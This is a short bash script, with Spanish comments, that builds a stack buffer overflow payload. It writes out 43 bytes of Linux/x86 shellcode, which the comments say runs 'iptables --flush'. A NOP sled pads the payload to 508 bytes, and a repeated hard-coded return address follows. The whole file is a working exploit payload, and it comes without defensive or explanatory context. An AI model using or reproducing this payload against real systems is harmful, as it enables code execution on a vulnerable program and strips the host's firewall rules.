#!/bin/bash

#43 bytes
#Ejecuta un iptables --flush
#Linux/x86 - iptables --flush 
echo -ne "\x31\xc0\x50\x66\x68\x2d\x46\x89\xe6\x50\x68\x62\x6c\x65\x73\x68\x69\x70\x74\x61\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x73\x89\xe3\x50\x56\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

for i in $(seq 44 508)
do
	echo -ne "\x90"
done

for i in 1 2
do
	echo -ne "\x8c\xd4\xff\xff"
done
